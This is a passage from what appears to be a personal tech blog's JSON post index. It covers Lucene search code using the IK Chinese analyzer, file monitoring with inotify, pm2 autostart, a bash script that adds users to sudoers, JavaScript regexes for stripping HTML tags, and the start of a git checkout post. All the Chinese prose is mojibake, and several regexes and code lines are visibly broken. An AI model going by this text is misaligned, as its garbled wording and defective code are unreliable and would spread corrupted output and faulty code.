å®ƒä¼šä»åŸå§‹è¾“å…¥çš„å•è¯ã€è¯ç»„å’Œå¸ƒå°”æŸ¥è¯¢ä¸­æå–é¡¹ï¼Œå¹¶ä¸”åŸºäºç›¸åº”çš„åŠ æƒå› å­ï¼ˆboost factorï¼‰ç»™å®ƒä»¬åŠ æƒã€‚ ä¸ºäº†ä¾¿äºQueryScoereä½¿ç”¨ï¼Œè¿˜å¿…é¡»å¯¹æŸ¥è¯¢çš„åŸå§‹å½¢å¼è¿›è¡Œé‡å†™ã€‚ æ¯”å¦‚ï¼Œå¸¦é€šé…ç¬¦æŸ¥è¯¢ã€æ¨¡ç³ŠæŸ¥è¯¢ã€å‰ç¼€æŸ¥è¯¢ä»¥åŠèŒƒå›´æŸ¥è¯¢ ç­‰ï¼Œéƒ½è¢«é‡å†™ä¸ºBoolenaQueryä¸­æ‰€ä½¿ç”¨çš„é¡¹ã€‚ åœ¨å°†Queryå®ä¾‹ä¼ é€’åˆ°QueryScorerä¹‹å‰ï¼Œå¯ä»¥è°ƒç”¨Query.rewrite (IndexReader)æ–¹æ³•æ¥é‡å†™Queryå¯¹è±¡ */ Scorer fragmentScorer = new QueryScorer(query); Highlighter highlighter = new Highlighter(formatter,fragmentScorer); Fragmenter fragmenter = new SimpleFragmenter(100); /* Highlighteråˆ©ç”¨Fragmenterå°†åŸå§‹æ–‡æœ¬åˆ†å‰²æˆå¤šä¸ªç‰‡æ®µã€‚ å†…ç½®çš„SimpleFragmenterå°†åŸå§‹æ–‡æœ¬åˆ†å‰²æˆç›¸åŒå¤§å°çš„ç‰‡æ®µï¼Œç‰‡æ®µé»˜è®¤çš„å¤§å°ä¸º100ä¸ªå­—ç¬¦ã€‚è¿™ä¸ªå¤§å°æ˜¯å¯æ§åˆ¶çš„ã€‚ */ highlighter.setTextFragmenter(fragmenter); ScoreDoc[] scoreDocs = topDocs.scoreDocs; for(ScoreDoc scDoc : scoreDocs){ Document document = indexSearcher.doc(scDoc.doc); Integer id = Integer.parseInt(document.get(&quot;id&quot;)); String name = document.get(&quot;name&quot;); String function = document.get(&quot;function&quot;); //float score = scDoc.score; //ç›¸ä¼¼åº¦ String lighterName = highlighter.getBestFragment(analyzer, &quot;name&quot;, name); if(null==lighterName){ lighterName = name; } String lighterFunciton = highlighter.getBestFragment(analyzer, &quot;function&quot;, function); if(null==lighterFunciton){ lighterFunciton = function; } Medicine medicine = new Medicine(); medicine.setId(id); medicine.setName(lighterName); medicine.setFunction(lighterFunciton); result.add(medicine); } } catch (Exception e) { e.printStackTrace(); }finally{ try { indexSearcher.close(); } catch (IOException e) { e.printStackTrace(); } } return result; } public static void main(String[] args) { LuceneIKUtil luceneProcess = new LuenceIKUtil(&quot;F:/index&quot;); try { luceneProcess.createIndex(); } catch (Exception e) { e.printStackTrace(); } //ä¿®æ”¹æµ‹è¯• luceneProcess.update(2, &quot;æµ‹è¯•å†…å®¹&quot;, &quot;ä¿®æ”¹æµ‹è¯•ã€‚ã€‚ã€‚&quot;); //æŸ¥è¯¢æµ‹è¯• String [] fields = {&quot;name&quot;,&quot;function&quot;}; List&lt;Medicine&gt; list = luenceProcess.search(fields,&quot;æ„Ÿå†’&quot;); for(int i=0; i&lt;list.size(); i++){ Medicine medicine = list.get(i); System.out.println(&quot;(&quot;+medicine.getId()+&quot;)&quot;+medicine.getName() + &quot;\\t&quot; + medicine.getFunction()); } //åˆ é™¤æµ‹è¯• //luenceProcess.delete(1); } }ç¨‹åºè¿è¡Œç»“æœåŠ è½½æ‰©å±•è¯å…¸ï¼š/dicdata/use.dic.dicåŠ è½½æ‰©å±•è¯å…¸ï¼š/dicdata/googlepy.dicåŠ è½½æ‰©å±•åœæ­¢è¯å…¸ï¼š/dicdata/ext_stopword.dicå…±æ£€ç´¢å‡º 4 æ¡è®°å½•(1)é“¶èŠ± æ„Ÿå†’é¢—ç²’ åŠŸèƒ½ä¸»æ²»ï¼šé“¶èŠ±æ„Ÿå†’é¢—ç²’ ï¼Œå¤´ç—›,æ¸…çƒ­ï¼Œè§£è¡¨ï¼Œåˆ©å’½ã€‚(4)æ„Ÿå†’çµèƒ¶å›Š åŠŸèƒ½ä¸»æ²»ï¼šé“¶èŠ±æ„Ÿå†’é¢—ç²’ ï¼Œå¤´ç—›,æ¸…çƒ­ï¼Œè§£è¡¨ï¼Œåˆ©å’½ã€‚(3)æ„Ÿå†’çµé¢—ç²’ åŠŸèƒ½ä¸»æ²»ï¼šè§£çƒ­é•‡ç—›ã€‚å¤´ç—› ,æ¸…çƒ­ã€‚(5)ä»å’Œ æ„Ÿå†’é¢—ç²’ åŠŸèƒ½ä¸»æ²»ï¼šç–é£æ¸…çƒ­ï¼Œå®£è‚ºæ­¢å’³,è§£è¡¨æ¸…çƒ­ï¼Œæ­¢å’³åŒ–ç—°ã€‚å¦‚ä½•åˆ¤æ–­ç´¢å¼•æ˜¯å¦å­˜åœ¨/*** åˆ¤æ–­æ˜¯å¦å·²ç»å­˜åœ¨ç´¢å¼•æ–‡ä»¶* @param indexPath* @return*/private boolean isExistIndexFile(String indexPath) throws Exception{File file = new File(indexPath);if (!file.exists()) {file.mkdirs();}String indexSufix=&quot;/segments.gen&quot;;//æ ¹æ®ç´¢å¼•æ–‡ä»¶segments.genæ˜¯å¦å­˜åœ¨åˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºç´¢å¼•File indexFile=new File(indexPath+indexSufix);return indexFile.exists();}é™„å½•: IKåˆ†è¯å¤„ç†è¿‡ç¨‹IKçš„æ•´ä¸ªåˆ†è¯å¤„ç†è¿‡ç¨‹é¦–å…ˆï¼Œä»‹ç»ä¸€ä¸‹IKçš„æ•´ä¸ªåˆ†è¯å¤„ç†è¿‡ç¨‹ï¼šLuceneçš„åˆ†è¯åŸºç±»æ˜¯Analyzerï¼Œæ‰€ä»¥IKæä¾›äº†Analyzerçš„ä¸€ä¸ªå®ç°ç±»IKAnalyzerã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦å®ä¾‹åŒ–ä¸€ä¸ªIKAnalyzerï¼Œå®ƒæœ‰ä¸€ä¸ªæ„é€ æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‚æ•°isMaxWordLengthï¼Œè¿™ä¸ªå‚æ•°æ˜¯æ ‡è¯†IKæ˜¯å¦é‡‡ç”¨æœ€å¤§è¯é•¿åˆ†è¯ï¼Œè¿˜æ˜¯é‡‡ç”¨æœ€ç»†ç²’åº¦åˆ‡åˆ†ä¸¤ç§åˆ†è¯ç®—æ³•ã€‚å®é™…ä¸¤ç§ç®—æ³•çš„å®ç°ï¼Œæœ€å¤§è¯é•¿åˆ‡åˆ†æ˜¯å¯¹æœ€ç»†ç²’åº¦åˆ‡åˆ†çš„ä¸€ç§åç»­å¤„ç†ï¼Œæ˜¯å¯¹æœ€ç»†ç²’åº¦åˆ‡åˆ†ç»“æœçš„è¿‡æ»¤ï¼Œé€‰æ‹©å‡ºæœ€é•¿çš„åˆ†è¯ç»“æœã€‚IKAnalyzerç±»é‡å†™äº†Analyzerçš„tokenStreamæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œfield nameå’Œè¾“å…¥æµreaderï¼Œå…¶ä¸­filed nameæ˜¯Luceneçš„å±æ€§åˆ—ï¼Œæ˜¯å¯¹æ–‡æœ¬å†…å®¹è¿›è¡Œè¿‡åˆ†è¯å¤„ç†å’Œåˆ›å»ºç´¢å¼•ä¹‹åï¼Œç´¢å¼•å¯¹åº”çš„ä¸€ä¸ªåç§°ï¼Œç±»ä¼¼æ•°æ®åº“çš„åˆ—åã€‚å› ä¸ºIKä»…ä»…æ¶‰åŠåˆ†è¯å¤„ç†ï¼Œæ‰€ä»¥å¯¹field nameæ²¡æœ‰è¿›è¡Œä»»ä½•å¤„ç†ï¼Œæ‰€ä»¥æ­¤å¤„ä¸åšä»»ä½•è®¨è®ºã€‚tokenStreamæ–¹æ³•åœ¨Luceneå¯¹æ–‡æœ¬è¾“å…¥æµreaderè¿›è¡Œåˆ†è¯å¤„ç†æ—¶è¢«è°ƒç”¨ï¼Œåœ¨IKAnalyzerçš„tokenStreamæ–¹æ³•é‡Œé¢ä»…ä»…å®ä¾‹åŒ–äº†ä¸€ä¸ªIKTokenizerç±»ï¼Œè¯¥ç±»ç»§æ‰¿äº†Luceneçš„Tokenizerç±»ã€‚å¹¶é‡å†™äº†incrementTokenæ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯å¤„ç†æ–‡æœ¬è¾“å…¥æµç”Ÿæˆtokenï¼Œä¹Ÿå°±æ˜¯Luceneçš„æœ€å°è¯å…ƒtermï¼Œåœ¨IKé‡Œé¢å«åšLexemeã€‚åœ¨IKtokenizerçš„æ„é€ æ–¹æ³•é‡Œé¢å®ä¾‹åŒ–äº†IKé‡Œé¢æœ€ç»ˆè¦çš„åˆ†è¯ç±»IKSegmentationï¼Œä¹Ÿç§°ä¸ºä¸»åˆ†è¯å™¨ã€‚å®ƒçš„æ„é€ æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œreaderå’ŒisMaxWordLengthã€‚IKsegmentationçš„æ„é€ æ–¹æ³•é‡Œé¢ï¼Œä¸»è¦åšäº†ä¸‰ä¸ªå·¥ä½œï¼Œåˆ›å»ºä¸Šä¸‹æ–‡å¯¹è±¡Contextï¼ŒåŠ è½½è¯å…¸ï¼Œåˆ›å»ºå­åˆ†è¯å™¨ã€‚Contexä¸»è¦æ˜¯å­˜å‚¨åˆ†è¯ç»“æœé›†å’Œè®°å½•åˆ†è¯å¤„ç†çš„æ¸¸æ ‡ä½ç½®ã€‚è¯å…¸æ˜¯ä½œä¸ºä¸€ä¸ªå•ä¾‹è¢«åˆ›å»ºçš„ï¼Œä¸»è¦æœ‰é‡è¯è¯å…¸ã€ä¸»è¯å…¸å’Œåœè¯è¯å…¸ã€‚è¯å…¸æ˜¯è¢«å­˜å‚¨åœ¨å­—å…¸ç‰‡æ®µç±»DictSegment è¿™ä¸ªå­—å…¸æ ¸å¿ƒç±»é‡Œé¢çš„ã€‚DictSegmentæœ‰ä¸€ä¸ªé™æ€çš„å­˜å‚¨ç»“æ„charMapï¼Œæ˜¯å…¬å…±è¯å…¸è¡¨ï¼Œç”¨æ¥å­˜å‚¨æ‰€æœ‰æ±‰å­—ï¼Œkeyå’Œvalueéƒ½æ˜¯ä¸€ä¸ªä¸­æ–‡æ±‰å­—ï¼Œç›®å‰IKé‡Œé¢çš„charMapå¤§æ¦‚æœ‰7100å¤šçš„é”®å€¼å¯¹ã€‚å¦å¤–ï¼ŒDictSegmentè¿˜æœ‰ä¸¤ä¸ªæœ€é‡è¦çš„æ•°æ®ç»“æ„ï¼Œæ˜¯ç”¨æ¥å­˜å‚¨å­—å…¸æ ‘çš„ï¼Œä¸€ä¸ªæ˜¯DictSegmentçš„æ•°ç»„childrenArrayï¼Œå¦ä¸€ä¸ªæ˜¯keyä¸ºå•ä¸ªæ±‰å­—ï¼ˆæ¯ä¸ªè¯æ¡çš„ç¬¬ä¸€ä¸ªæ±‰å­—ï¼‰ï¼Œvalueæ˜¯DictSegmentçš„HashMap childrenMapã€‚è¿™ä¸¤ä¸ªæ•°æ®ç»“æ„äºŒè€…å–å…¶ä¸€ï¼Œç”¨æ¥å­˜å‚¨å­—å…¸æ ‘ã€‚å­åˆ†è¯å™¨æ‰æ˜¯çœŸæ­£çš„åˆ†è¯ç±»ï¼ŒIKé‡Œé¢æœ‰ä¸‰ä¸ªå­åˆ†è¯å™¨ï¼Œé‡è¯åˆ†è¯å™¨ï¼ŒCJKåˆ†è¯å™¨ï¼ˆå¤„ç†ä¸­æ–‡ï¼‰ï¼Œåœè¯åˆ†è¯å™¨ã€‚ä¸»åˆ†è¯å™¨IKSegmentationéå†è¿™ä¸‰ä¸ªåˆ†è¯å™¨å¯¹æ–‡æœ¬è¾“å…¥æµè¿›è¡Œåˆ†è¯å¤„ç†ã€‚IKTokenizerçš„incrementTokenæ–¹æ³•è°ƒç”¨äº†IKSegmentationçš„nextæ–¹æ³•ï¼Œnextçš„ä½œç”¨æ˜¯è·å¾—ä¸‹ä¸€ä¸ªåˆ†è¯ç»“æœã€‚nextåœ¨ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œéœ€è¦åŠ è½½æ–‡æœ¬è¾“å…¥æµï¼Œå¹¶å°†å…¶è¯»å…¥bufferï¼Œæ­¤æ—¶ä¾¿éå†å­åˆ†è¯å™¨ï¼Œå¯¹bufferç§çš„æ–‡æœ¬å†…å®¹è¿›è¡Œåˆ†è¯å¤„ç†ï¼Œç„¶åæŠŠåˆ†è¯ç»“æœæ·»åŠ åˆ°contextçš„lexemeSetä¸­ã€‚è½¬è½¬è¯·æ³¨æ˜å‡ºå¤„:","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"linux  æ–‡ä»¶ç›‘æ§","slug":"history/tech/5953c4d0c2b92f5665eed9e5","date":"2016-01-04T23:18:15.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e5/","excerpt":"","text":"yum install inotify-toolsinotifywait -rme modify,attrib,move,close_write,create,delete,delete_self /home","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"pm2 å¼€æœºè‡ªå¯åŠ¨","slug":"history/tech/5953c4d0c2b92f5665eed9e1","date":"2016-01-04T04:34:57.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e1/","excerpt":"","text":"å…ˆpm2 startè¿è¡Œä½ è¦å¼€æœºå¯åŠ¨çš„ç¨‹åºï¼Œ å†pm2 save, è¿™æ—¶å¯ä»¥æŸ¥çœ‹more ~/.pm2/dump.pm2è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å·²ç»æœ‰ä¿å­˜åˆ°æ•°æ®, æœ€åæ‰æ˜¯pm2 startup","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"æ·»åŠ rootæƒé™è„šæœ¬","slug":"history/tech/5953c4d0c2b92f5665eed9e3","date":"2016-01-04T03:03:19.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e3/","excerpt":"","text":"12345678910111213#!/bin/bashchmod 700 /etc/sudoersdeclare NAMEvisudo=/usr/sbin/visudoread -p &quot;Please input you want add user in sudo:&quot; OPT NAME=(`echo $OPT | awk &apos;BEGIN &#123;ORS=&quot; &quot;&#125; &#123;for (i=1;i&lt;=NF;i++) &#123;print $i&#125;&#125;&apos;`)#echo $&#123;NAME&#125;COUNT=$(($&#123;#NAME&#125;-1))for i in `seq 0 $COUNT`; do#cat /etc/sudoerssed -i /^root[]*ALL*/a\\ &quot;$&#123;NAME&#125; ALL=(ALL) ALL&quot; /etc/sudoersdonechmod 440 /etc/sudoers","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"jsè¿‡æ»¤HTMLæ ‡ç­¾ä»¥åŠ&amp;nbsp;","slug":"history/tech/5953c4d0c2b92f5665eed9e2","date":"2016-01-04T02:22:38.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e2/","excerpt":"","text":"http://www.cnblogs.com/liszt/archive/2011/08/16/2140007.htmlä»Šå¤©è¦åšä¸€ä¸ªåº”ç”¨â€“åˆ¤æ–­ç¼–è¾‘å™¨ä¸­æ–‡å­—çš„ä¸ªæ•°ã€‚å¦‚æœå°‘å¦‚20ä¸ªå­—å°±ä¸èƒ½è®©å…¶æäº¤ã€‚æ²¡å¤šæƒ³ï¼Œæ­£å¥½å‘¨æœ«çš„æ—¶å€™çœ‹äº†ä¸€ä¸‹jsä¸­æ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹ã€‚å¾ˆå®¹æ˜“å°±æƒ³åˆ°äº†è¦ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚è™½è¯´çœ‹äº†æ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹æ˜¯çœ‹äº†ï¼Œä½†æ˜¯æ¯•ç«Ÿè¿˜æ˜¯åˆšæ¥æ¥è§¦ï¼Œè¿åŸºæœ¬çš„æ¦‚å¿µéƒ½å¾ˆæ¨¡ç³Šï¼Œäºæ˜¯åªå¥½åœ¨ç½‘ä¸Šæ‰¾åˆ°å¦‚ä¸‹çš„ä»£ç ï¼šfunction setContent(str) {str = str.replace(/&lt;/?&gt;/g,â€™â€™); //å»é™¤HTML tagstr.value = str.replace(/\\n/g,â€™\\nâ€™); //å»é™¤è¡Œå°¾ç©ºç™½//str = str.replace(/\\n*\\r/g,â€™\\nâ€™); //å»é™¤å¤šä½™ç©ºè¡Œreturn str;}æµ‹è¯•çš„æ—¶å€™å‘ç°è¿™æ®µä»£ç ä¸èƒ½è¿‡æ»¤æ‰ç½‘é¡µä¸­ç©ºæ ¼å­—ç¬¦(å³ï¼š )ã€‚äºæ˜¯è‡ªå·±åˆæ”¹é€ äº†ä¸€ä¸‹ï¼šfunction removeHTMLTag(str) {str = str.replace(/&lt;/?&gt;/g,â€™â€™); //å»é™¤HTML tagstr = str.replace(/\\n/g,â€™\\nâ€™); //å»é™¤è¡Œå°¾ç©ºç™½//str = str.replace(/\\n*\\r/g,â€™\\nâ€™); //å»é™¤å¤šä½™ç©ºè¡Œstr=str.replace(/ /ig,â€™â€™);//å»æ‰return str;}æ©ï¼Œæˆ‘çš„è¦æ±‚è¾¾åˆ°äº†ã€‚ç°åœ¨æ¥ç¨ç¨è§£é‡Šä¸€ä¸‹æ‰€ç”¨åˆ°çš„ä¸‰ä¸ªæ­£åˆ™è¡¨è¾¾å§(éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå› ä¸ºè‡ªå·±ä¹Ÿæ˜¯åˆšåˆšæ¥è§¦ï¼Œä¹Ÿè®¸æˆ‘çš„è§£é‡Šå¹¶ä¸æ˜¯æ­£ç¡®çš„ï¼Œä»…ä¾›å‚è€ƒ)ï¼šç¬¬ä¸€ä¸ª:/&lt;/?*&gt;/gåœ¨jsä¸­æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä»¥â€œ/â€å¼€å¤´çš„ï¼Œåé¢çš„/gï¼Œå«ä¹‰æ˜¯è¡¨ç¤ºå…¨å±€æ¨¡å¼ï¼Œæ„æ€æ˜¯åœ¨å°†åŒ¹é…çš„æ¨¡å¼åº”ç”¨äºæ•´ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…ä¸Šä¹‹åå°±åœæ­¢åŒ¹é…äº†ã€‚&lt;/?*&gt; è¿™ä¸ªåˆ†å¼€æ¥è§£é‡Šï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå­—ç¬¦â€œ\\â€æ˜¯ä¸€ä¸ªè½¬ç§»å­—ç¬¦ï¼Œç”¨æ¥è½¬ç§»åé¢çš„â€/â€å­—ç¬¦çš„ã€‚?åŒ¹é…0æˆ–1ä¸ªæ­£å¥½åœ¨å®ƒä¹‹å‰çš„é‚£ä¸ªå­—ç¬¦ã€‚æ³¨æ„ï¼šè¿™ä¸ªå…ƒå­—ç¬¦ä¸æ˜¯æ‰€æœ‰çš„è½¯ä»¶éƒ½æ”¯æŒçš„ã€‚æ‰€ä»¥&lt;/?å°±æ˜¯åŒ¹é…htmlæ ‡ç­¾ä¸­çš„â€&lt;/â€æ ¼å¼æˆ–è€…â€œ&lt;â€æ ¼å¼çš„ã€‚å†æ¥è¯´*&gt;ã€‚[]æ˜¯å«ä¹‰æ˜¯ï¼šQQæˆªå›¾20110815230803çš„å«ä¹‰æ˜¯ï¼šåŒ¹é…ä¸€è¡Œçš„å¼€å§‹ã€‚ä¾‹å¦‚æ­£åˆ™è¡¨è¾¾å¼When inèƒ½å¤ŸåŒ¹é…å­—ç¬¦ä¸²&quot;When in the course of human events&quot;çš„å¼€å§‹ï¼Œä½†æ˜¯ä¸èƒ½åŒ¹é…&quot;What and When in the&quot;ã€‚æ„æ€å°±æ˜¯åŒ¹é…ä»¥â€œWhen inâ€å¼€å¤´çš„æ–‡å­—ã€‚*çš„å«ä¹‰æ˜¯ï¼šåŒ¹é…0æˆ–å¤šä¸ªæ­£å¥½åœ¨å®ƒä¹‹å‰çš„é‚£ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚æ­£åˆ™è¡¨è¾¾å¼ã€‚*æ„å‘³ç€èƒ½å¤ŸåŒ¹é…ä»»æ„æ•°é‡çš„ä»»ä½•å­—ç¬¦å› æ­¤*æ„æ€æ˜¯åŒ¹é…&gt;ä¹‹å¤–çš„å­—ç¬¦ã€‚æ‰€ä»¥å¯ä»¥åŒ¹é…å‡ºçš„æ¨¡å¼å¯ä»¥åƒä¸‹é¢è¿™æ ·çš„ï¼šdivæˆ‘éœ€è¦çš„æ–‡å­—&lt;/divpæˆ‘éœ€è¦çš„æ–‡å­—&lt;/p*å’Œå‰é¢çš„ç»“åˆåœ¨ä¸€èµ·å°±å¯ä»¥åŒ¹é…ä¸‹é¢è¿™äº›å­—ç¬¦äº†ï¼šdiv&gt;æˆ‘éœ€è¦çš„æ–‡å­—&lt;/divp&gt;æˆ‘éœ€è¦çš„æ–‡å­—&lt;/pbr /å†åŠ ä¸Šåé¢çš„&gt;å°±å¯ä»¥åŒ¹é…ä¸‹é¢çš„å­—ç¬¦äº†ï¼šdiv&gt;æˆ‘éœ€è¦çš„æ–‡å­—p&gt;æˆ‘éœ€è¦çš„æ–‡å­—br /&gt;è¿™æ ·å°±å®Œæˆäº†ä¸€å¯¹HTMLæ ‡ç­¾çš„åŒ¹é…äº†ã€‚(å¤šå¥è¯ï¼Œæ€»è§‰å¾—è¿™ä¸ªåŒ¹é…æœ‰ç‚¹å•°å—¦ï¼Œä½†æ˜¯ä¸çŸ¥é“åˆ°åº•åœ¨å“ªä¸ªåœ°æ–¹å•°å—¦)ç¬¬äºŒä¸ªï¼š/*\\n/gï¼šæˆ‘ä¹Ÿæ²¡æœ‰çœ‹æ‡‚ç¬¬ä¸‰ä¸ªï¼š/ /igï¼šå°±æ˜¯ç›´æ¥æŸ¥æ‰¾ å­—ç¬¦ï¼Œåé¢çš„/igçš„å«ä¹‰æ˜¯åœ¨å…¨å±€æ¨¡å¼ä¸‹è¿›è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æŸ¥æ‰¾ã€‚gä»£è¡¨å…¨å±€ï¼Œiè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"jså‡½æ•°å‰é¢çš„åŠ å·ï¼Œå¹å·","slug":"history/tech/5953c4d0c2b92f5665eed9e0","date":"2016-01-02T23:24:56.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e0/","excerpt":"","text":"+function(){}();è¿™é‡Œçš„åŠ å·ï¼Œä¹Ÿå¯ä»¥æ›¿æ¢æˆ!,~ç­‰å…¶ä»–ä¸€å…ƒæ“ä½œç¬¦ï¼Œå…¶æ•ˆæœç›¸å½“äºï¼šview plaincopyåœ¨CODEä¸ŠæŸ¥çœ‹ä»£ç ç‰‡æ´¾ç”Ÿåˆ°æˆ‘çš„ä»£ç ç‰‡(function() { console.log(â€œFoo!â€); })();// or(function() { console.log(â€œFoo!â€); }());å¦‚æœæ²¡æœ‰è¿™ä¸ªåŠ å·çš„è¯ï¼Œè§£æå™¨ä¼šè®¤ä¸ºfunctionæ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜çš„å¼€å§‹ï¼Œè€Œåé¢ï¼ˆï¼‰å°†ä¼šå¯¼è‡´è¯­æ³•é”™è¯¯ã€‚åœ¨functionå‰é¢åŠ ä¸Š+å·æ—¶ï¼Œå°±å˜æˆäº†ä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼ï¼Œè€Œå‡½æ•°è¡¨è¾¾å¼åé¢åˆæ·»åŠ äº†ä¸€ä¸ª()å°±å˜æˆäº†ä¸€ä¸ªç«‹å³æ‰§è¡Œçš„å‡½æ•°äº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"Gitæ£€å‡º","slug":"history/tech/5953c4d0c2b92f5665eed9df","date":"2016-01-02T03:41:15.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9df/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9df/","excerpt":"","text":"æ£€å‡ºå‘½ä»¤æ­¤å‘½ä»¤ä¼šé‡å†™å·¥ä½œåŒºè¯¥å‘½ä»¤çš„å®è´¨å°±æ˜¯ä¿®æ”¹HEADæœ¬èº«çš„æŒ‡å‘ï¼Œä¸ä¼šå½±å“åˆ†æ”¯æ¸¸æ ‡ã€‚å½“æ‰§è¡Œæ­¤å‘½ä»¤æ—¶ï¼ŒHEADå¤´æŒ‡é’ˆè¢«æ›´æ”¹äº†ï¼Œç”±æŒ‡å‘ä¸€ä¸ªå¼•ç”¨ï¼ˆåˆ†æ”¯ï¼‰å˜æˆäº†æŒ‡å‘ä¸€ä¸ªæäº¤IDï¼Œåˆ†æ”¯ï¼ˆmasterï¼‰çš„æŒ‡å‘æ²¡æœ‰æ”¹å˜ï¼Œä»æ—§æŒ‡å‘åŸæœ‰çš„æäº¤IDâ€œåˆ†ç¦»å¤´æŒ‡é’ˆâ€çŠ¶æ€ï¼šæŒ‡çš„æ˜¯HEADå¤´æŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªå…·ä½“çš„æäº¤IDç”¨æ³•ä¸€ï¼šgit checkoutâ€¦ 